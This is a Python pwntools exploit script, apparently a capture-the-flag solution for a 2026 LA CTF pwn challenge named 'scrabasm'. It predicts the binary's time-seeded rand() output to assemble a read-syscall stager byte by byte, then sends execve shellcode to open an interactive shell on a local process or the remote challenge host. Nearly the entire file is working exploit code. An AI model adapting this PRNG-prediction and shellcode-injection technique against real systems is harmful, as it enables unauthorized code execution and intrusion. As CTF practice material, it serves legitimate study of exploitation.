#!/usr/bin/env python3
from ctypes import CDLL

from pwn import *

TARGET_PATH = os.path.realpath("/ctf-writeups/2026/la-ctf/pwn/scrabasm/dist/chall")
LIBC_PATH = os.path.realpath("/lib/x86_64-linux-gnu/libc.so.6")
HAND_SIZE = 14

elf = context.binary = ELF(TARGET_PATH)
libc = CDLL(LIBC_PATH)

context.update(log_level="debug", terminal=["tmux", "split-window", "-h"])


def get_stream():
    if "remote" in sys.argv:
        return remote("chall.lac.tf", 31338)

    return process(TARGET_PATH)


def attach_gdb(r):
    if "debug" in sys.argv:
        bkps = []
        cmds = []

        gdbscript = ["break {}".format(x) for x in bkps] + cmds
        gdb.attach(r, "\n".join(gdbscript))


def exploit(r):
    hand = []

    for i in range(HAND_SIZE):
        hand.append(libc.rand() & 0xFF)

    log.info(" ".join(hex(hand[i]) for i in range(HAND_SIZE)))

    i = 0
    commands = []
    code = asm(
        """
        xor rax, rax
        push rdi
        pop rsi
        xor rdi, rdi
        mov dl, 0xff
        syscall
        """
    )

    while i < len(code):
        if hand[i] != code[i]:
            commands.append(f"1\n{i}")
            hand[i] = libc.rand() & 0xFF
        else:
            i += 1

    r.sendlineafter(b"> ", "\n".join(commands).encode())
    r.sendlineafter(b"> ", b"2")
    r.send(b"\x90" * len(code) + asm(shellcraft.sh()))
    r.interactive()


def main():
    r = get_stream()
    libc.srand(libc.time())
    attach_gdb(r)
    exploit(r)


if __name__ == "__main__":
    main()
